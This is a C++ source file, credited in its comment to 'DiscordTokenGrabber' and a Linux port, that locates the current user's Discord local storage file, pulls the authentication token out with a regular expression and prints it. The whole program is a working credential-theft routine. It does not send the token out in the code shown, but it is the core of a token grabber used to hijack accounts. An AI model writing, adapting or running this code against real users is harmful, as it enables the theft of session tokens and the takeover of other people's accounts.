#include <iostream>
#include <fstream>
#include <string.h>
#include <regex>
#include <stdlib.h>

/*
 * Original Awesome DiscordTokenGrabber by Axua (https://github.com/Axua)
 * Modified by TheHandGrip to work with Linux (https://github.com/TheHandGrip)
*/

using namespace std;

int main () {
  string username = getenv("USER");
  char character;
  string path = "/home/";
  path += username;
  path += "/.config/discord/Local Storage/https_discordapp.com_0.localstorage";
  ifstream myfile (path, ios::binary);
  if (!myfile.is_open()){
    cout << "Unable to open file";
    return 1;
  }

  string content;
  while (myfile >> noskipws >> character)
  {
    if((character < 0x20 || character > 0x7E) && character != '\n')continue;
    content += character;
  }
  myfile.close();
  regex pattern ("token.{0,5}\"([^\"]{58,62})\"");
  smatch match;
  regex_search(content, match, pattern);
  string token = match[0];
  token = token.erase(0,5);
  cout << "Discord token: " << token << endl;
  return 0;
}
